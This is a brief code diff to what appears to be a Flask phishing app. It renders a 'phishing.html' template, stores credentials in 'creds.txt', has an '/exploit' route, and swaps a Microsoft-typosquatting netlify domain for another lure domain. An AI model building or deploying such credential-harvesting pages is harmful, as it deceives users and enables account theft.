@@ -10,7 +10,7 @@ creds_file = 'creds.txt'
 
 @app.route('/')
 def index():
-    return render_template('phishing.html', domain="rnicrosoftofficial.netlify.app")
+    return render_template('phishing.html', domain="congratsongradujating.netlify.app")
 
 @app.route('/exploit')
 def exploit():
